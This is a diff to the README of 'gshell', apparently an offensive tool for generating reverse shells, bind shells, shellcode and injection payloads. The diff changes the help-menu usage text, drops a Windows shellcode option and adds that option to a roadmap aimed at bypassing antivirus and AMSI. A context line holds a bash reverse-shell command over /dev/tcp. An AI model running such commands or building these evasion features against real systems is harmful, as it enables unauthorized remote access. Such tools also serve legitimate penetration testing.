@@ -107,9 +107,9 @@ bash -i >& /dev/tcp/$ip/$port 0>&1
 This is the help menu:
 
 ```powershell
-PS C:\gshell> python .\gshell.py -h                                       
-usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--windows] [--linux] [--base64] [--base32] [--base16] [--url]
-                 [--no-block] [-l] [-a] [-h]
+PS C:\gshell> python gshell.py -h                                    
+usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--linux] [--base64] [--base32]
+                 [--base16] [--url] [--no-block] [-l] [-a] [-h]
 
  ██████  ███████ ██   ██ ███████ ██      ██
 ██       ██      ██   ██ ██      ██      ██
@@ -143,7 +143,6 @@ Shellcode Required Options:
   --shellcode           Generate shellcodes, requires --srev or --sbind and --windows or --linux
   --srev                Reverse shell shellcode
   --sbind               Bind shell shellcode
-  --windows             Windows shellcode
   --linux               Linux shellcode
 
 Encoding Options:
@@ -397,3 +396,4 @@ The version 2.0 should have the following:
 1. Encryptors: To bypass AVs
 2. Obfuscators: To bypass AVs
 3. Anti-AMSI: To bypass AMSI
+4. Add Windows Shellcode
